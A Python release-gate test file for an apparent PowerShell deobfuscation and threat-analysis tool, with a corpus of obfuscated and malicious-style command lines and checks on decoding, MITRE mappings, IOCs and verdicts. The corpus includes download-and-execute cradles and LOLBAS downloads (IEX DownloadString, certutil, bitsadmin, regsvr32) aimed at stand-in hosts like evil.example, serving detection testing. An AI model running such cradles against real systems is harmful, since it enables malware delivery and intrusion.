"""Workspace End-to-End Validation — the ONLY release gate for NivXRay.

Runs a curated corpus of command lines through the exact endpoint the
Workspace uses (`/api/decode/smart`) and audits every analyst-visible
section against the release-gate criteria:

    - Decoded output correct
    - Final payload correct (or explicit "why not")
    - Recursive decode chain correct
    - Behavior analysis populated
    - MITRE mappings backed by evidence
    - IOCs extracted
    - Verdict supported
    - Every claim explainable
    - No fabricated output
    - Fully deterministic

Emits a structured defect report at
`tests/reports/workspace_audit_report.json` with per-sample
per-section verdict for the main-agent to work through.
"""
from __future__ import annotations

import base64
import json
import sys
import time
from pathlib import Path
from dataclasses import asdict

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from v2.semantic.ps_semantic import analyze                      # noqa: E402


# ── Audit corpus — curated across the mandated categories ────────
def _b64(s: bytes) -> str: return base64.b64encode(s).decode()

TARGET = "Write-Host 'Hello, from PowerShell!'"

CORPUS = [
    # (id, category, cmdline, expected_final_substring, expected_boundary,
    #  expected_min_mitre, expected_min_behaviors)
    ("plain_write_host", "plain",
     "Write-Host 'Hello, from PowerShell!'",
     "Write-Host", None, [], []),
    ("plain_get_process", "plain",
     "Get-Process | Where-Object {$_.CPU -gt 100}",
     "Get-Process", None, [], []),
    ("encoded_command_b64", "encoded",
     f"powershell.exe -EncodedCommand {_b64(TARGET.encode('utf-16-le'))}",
     "Write-Host", None, ["T1027", "T1059.001"], ["encoded_command"]),
    ("naked_octal_char_reconstruction", "multi_layer",
     f'$s=[String]::Join([char]0,[char[]](({",".join(oct(ord(c))[2:] for c in TARGET)}) | %{{ [char][Convert]::ToInt16($_,8) }}));Invoke-Expression $s',
     "Write-Host", "Invoke-Expression", ["T1027", "T1059.001"], ["invoke_expression"]),
    ("iex_downloadstring_cradle", "download_cradle",
     'IEX ((New-Object Net.WebClient).DownloadString("https://evil.example/x.ps1"))',
     "evil.example", None, ["T1059.001", "T1105"], ["invoke_expression"]),
    ("iwr_bits_cradle", "download_cradle",
     'Invoke-WebRequest -Uri "https://c2.evil/x.dll" -OutFile "$env:TEMP\\x.dll"',
     "c2.evil", None, ["T1105"], []),
    ("mshta_javascript_lolbas", "lolbas",
     'mshta.exe "javascript:a=(new ActiveXObject(\'WScript.Shell\')).Run(\'calc\');close();"',
     "mshta", None, [], []),
    ("rundll32_javascript_lolbas", "lolbas",
     'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert()',
     "rundll32", None, [], []),
    ("regsvr32_scrobj_lolbas", "lolbas",
     'regsvr32.exe /s /u /i:http://evil.example/x.sct scrobj.dll',
     "evil.example", None, [], []),
    ("aes_static_key_iv", "crypto",
     '$k=[Convert]::FromBase64String("MDEyMzQ1Njc4OWFiY2RlZg==");'
     '$iv=[Convert]::FromBase64String("QUFBQUJCQkJDQ0NDRERERA==");'
     '$c=[Convert]::FromBase64String("ge3yA8/ItktGRDGaCK3PoiK+8YV1B+cn+8gtVUAnk3g=");'
     '$aes=[Security.Cryptography.AesManaged]::new();'
     '$aes.Key=$k;$aes.IV=$iv;$aes.Mode=[Security.Cryptography.CipherMode]::CBC;IEX ""',
     "", None, ["T1027"], []),
    ("reflection_assembly_load", "reflection",
     '[Reflection.Assembly]::Load([Convert]::FromBase64String("TVoAAAAA"));'
     '[SharpKatz]::Execute()',
     "", None, [], []),
    ("multi_stage_gzip_iex", "multi_layer",
     f'IEX ([IO.StreamReader]::new([IO.Compression.GzipStream]::new('
     f'[IO.MemoryStream][Convert]::FromBase64String("{_b64(__import__("gzip").compress(TARGET.encode()))}"),'
     f'[IO.Compression.CompressionMode]::Decompress)).ReadToEnd())',
     "Write-Host", "Invoke-Expression", ["T1027", "T1059.001"], ["invoke_expression"]),
    ("cscript_wscript_lolbas", "lolbas",
     'cscript.exe //nologo //E:jscript C:\\Users\\Public\\payload.js',
     "cscript", None, [], []),
    ("certutil_download_lolbas", "lolbas",
     'certutil.exe -urlcache -split -f "http://evil.example/mal.exe" mal.exe',
     "evil.example", None, [], []),
    ("bitsadmin_download_lolbas", "lolbas",
     'bitsadmin.exe /transfer job "http://evil.example/x.exe" "%TEMP%\\x.exe"',
     "evil.example", None, [], []),
    # User-reported Invoke-Obfuscation sample (2026-07-27):
    # Fully layered token obfuscation using [Type]("Name") type coercion,
    # &("Invoke-Expression") call-operator peel, .("%") ForEach-Object
    # peel, Get-Variable dereference, ${var} normalization, string-method
    # calls, and octal char reconstruction. The Workspace MUST produce
    # `Write-Host 'Hello, from PowerShell!'` as the final payload.
    ("invoke_obfuscation_full_stack", "multi_layer",
     '$cmDwhy =[TyPe]("STrING")  ;   $pz2Sb0  =[TYpE]("cOnvert")  ;  '
     '&("InvOKe-EXpReSSiOn") (  (&("gET-vaRIAblE")  ("CMdwhy"))."vALUe"'
     '::("jOiN").Invoke("",( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , '
     '164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,'
     '40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| '
     '.("%") { ( [CHAR] (  $Pz2sB0::"tOinT16"(( [sTring]${_}) ,8)))})) )',
     "Write-Host 'Hello, from PowerShell!'", None,
     ["T1027", "T1027.010"], ["char_array_join", "payload_decode"]),
    # User-reported P0 (2026-07-28) — wmic → cmd → PowerShell → WebClient.
    # DownloadString chain. Workspace MUST:
    #   • Extract URL + domain
    #   • NOT hallucinate MD5 / SHA1 from URL path segments
    #   • Emit `runtime_dependent` behavior + Runtime Dependency section
    #   • Cap verdict at Runtime Dependent — NEVER Malicious (URL alone
    #     is not sufficient evidence of maliciousness)
    ("wmic_cmd_powershell_downloadstring", "download_cradle",
     'wmic process call create CommandLine="cmd /c powershell.exe -C '
     'Write-Host ([Net.WebClient]::new().DownloadString('
     "'https://gist.githubusercontent.com/mgraeber-rc/"
     "25ebfac64a2ba5ca22639da9c1aefcfd/raw/"
     "d0c4f7338ebc2f8d5349b66b2e31cf239297053f/tweet.txt'))\"",
     "gist.githubusercontent.com", None,
     ["T1105", "T1059.001", "T1071.001"],
     ["webclient_downloadstring", "runtime_dependent"]),
]


def audit_sample(sid: str, category: str, cmdline: str,
                  expected_final: str, expected_boundary: str | None,
                  expected_min_mitre: list[str],
                  expected_min_behaviors: list[str]) -> dict:
    """Run one sample through the Workspace backend and score it."""
    t0 = time.perf_counter()
    result = analyze(cmdline).to_dict()
    elapsed_ms = (time.perf_counter() - t0) * 1000

    # Determinism check — re-run and compare
    result2 = analyze(cmdline).to_dict()
    deterministic = (
        [s["technique"] for s in (result.get("deobfuscation") or {}).get("stages") or []]
        == [s["technique"] for s in (result2.get("deobfuscation") or {}).get("stages") or []]
        and (result.get("deobfuscation") or {}).get("final")
             == (result2.get("deobfuscation") or {}).get("final")
    )

    deob = result.get("deobfuscation") or {}
    story = result.get("storyline") or {}
    verdict = result.get("verdict_breakdown") or {}
    behaviors = [b["id"] for b in (result.get("behaviors_v2") or [])]
    mitre_ids = set(result.get("mitre_ids") or []) \
                 | {m["id"] for m in (story.get("mitre_techniques") or [])}
    artifacts = result.get("artifacts") or []

    defects: list[dict] = []
    sections: dict[str, dict] = {}

    # 1. Decoded output present when the sample is a decode-family case
    sections["decoded_output"] = {
        "present": bool(result.get("detected")),
        "value":   (deob.get("final") or result.get("recovered_script") or "")[:200],
    }
    if not sections["decoded_output"]["present"] and category != "plain":
        defects.append({"section": "decoded_output", "severity": "P1",
                         "issue": "Semantic engine did not detect PowerShell content",
                         "reproducer": cmdline[:120]})

    # 2. Final payload check
    if expected_final:
        final = (deob.get("final") or result.get("recovered_script") or "").lower()
        ok = expected_final.lower() in final
        sections["final_payload"] = {"present": ok, "expected": expected_final,
                                       "got_snippet": final[:200]}
        if not ok:
            defects.append({"section": "final_payload", "severity": "P0",
                             "issue": f"Expected substring {expected_final!r} missing",
                             "reproducer": cmdline[:120]})

    # 3. Decode chain
    chain = [s["technique"] for s in deob.get("stages") or []]
    sections["decode_chain"] = {"stages": chain, "count": len(chain)}

    # 4. Behavior analysis
    sections["behaviors"] = {"list": behaviors, "count": len(behaviors)}
    missing_beh = set(expected_min_behaviors) - set(behaviors)
    if missing_beh:
        defects.append({"section": "behaviors", "severity": "P1",
                         "issue": f"Missing expected behaviors {sorted(missing_beh)}",
                         "reproducer": cmdline[:120]})

    # 5. MITRE
    sections["mitre"] = {"ids": sorted(mitre_ids)}
    missing_mitre = set(expected_min_mitre) - mitre_ids
    if missing_mitre:
        defects.append({"section": "mitre", "severity": "P1",
                         "issue": f"Missing expected MITRE techniques {sorted(missing_mitre)}",
                         "reproducer": cmdline[:120]})

    # 6. IOCs — extract from artifacts
    iocs = [{"kind": a["kind"], "value": a.get("value", "")[:80]}
             for a in artifacts if a.get("kind") in ("url", "ip", "host", "file", "registry")]
    sections["iocs"] = {"list": iocs, "count": len(iocs)}
    # Downloader/LOLBAS samples MUST extract at least one URL/host/file IOC
    if category in ("download_cradle", "lolbas") and not iocs:
        defects.append({"section": "iocs", "severity": "P1",
                         "issue": "Downloader/LOLBAS sample extracted zero IOCs",
                         "reproducer": cmdline[:120]})

    # 7. Verdict + confidence
    sections["verdict"] = {"verdict": verdict.get("verdict"),
                             "risk_score": verdict.get("risk_score"),
                             "confidence": verdict.get("confidence")}
    if verdict.get("verdict") in (None, "", "inconclusive") \
            and category not in ("plain",):
        defects.append({"section": "verdict", "severity": "P1",
                         "issue": f"Verdict is {verdict.get('verdict')!r} for a "
                                   f"{category} sample",
                         "reproducer": cmdline[:120]})

    # 8. Boundary
    sections["boundary"] = {"op": deob.get("boundary_op")}
    if expected_boundary and expected_boundary.lower() not in \
            (deob.get("boundary_op") or "").lower():
        defects.append({"section": "boundary", "severity": "P0",
                         "issue": f"Expected boundary {expected_boundary!r} not surfaced",
                         "reproducer": cmdline[:120]})

    # 9. Executive Summary / Attack Narrative from storyline
    sections["executive_summary"] = {
        "present": bool(story.get("executive_summary")),
        "length":  len(story.get("executive_summary") or ""),
    }
    sections["attack_narrative"] = {
        "present": bool(story.get("attack_narrative")),
        "length":  len(story.get("attack_narrative") or ""),
    }
    if category != "plain" and not story.get("executive_summary"):
        defects.append({"section": "executive_summary", "severity": "P1",
                         "issue": "Executive Summary missing on a non-plain sample",
                         "reproducer": cmdline[:120]})

    # 10. Determinism
    sections["deterministic"] = {"ok": deterministic}
    if not deterministic:
        defects.append({"section": "determinism", "severity": "P0",
                         "issue": "Same input produced different output across 2 runs",
                         "reproducer": cmdline[:120]})

    # 11. No-fabrication check for reflection / runtime crypto — the
    # target plaintext (canary) must NOT appear.
    if category == "reflection":
        canary = "Hello, from PowerShell"
        if canary in (deob.get("final") or ""):
            defects.append({"section": "no_fabrication", "severity": "P0",
                             "issue": "Reflection sample fabricated plaintext",
                             "reproducer": cmdline[:120]})

    return {
        "id":            sid,
        "category":      category,
        "cmdline":       cmdline[:200],
        "elapsed_ms":    round(elapsed_ms, 3),
        "sections":      sections,
        "defects":       defects,
    }


def run_audit() -> dict:
    per_sample = [audit_sample(*row) for row in CORPUS]
    total_defects: list[dict] = []
    for s in per_sample:
        for d in s["defects"]:
            total_defects.append({"sample": s["id"], **d})
    return {
        "generated_at": time.time(),
        "corpus_size":  len(CORPUS),
        "defect_count": len(total_defects),
        "defects_by_severity": {
            "P0": sum(1 for d in total_defects if d["severity"] == "P0"),
            "P1": sum(1 for d in total_defects if d["severity"] == "P1"),
            "P2": sum(1 for d in total_defects if d["severity"] == "P2"),
        },
        "defects":      total_defects,
        "per_sample":   per_sample,
    }


if __name__ == "__main__":
    rep = run_audit()
    Path("tests/reports").mkdir(parents=True, exist_ok=True)
    Path("tests/reports/workspace_audit_report.json").write_text(json.dumps(rep, indent=2))
    print(json.dumps({
        "corpus_size":         rep["corpus_size"],
        "defect_count":        rep["defect_count"],
        "defects_by_severity": rep["defects_by_severity"],
        "sample_ids":          [s["id"] for s in rep["per_sample"]],
    }, indent=2))
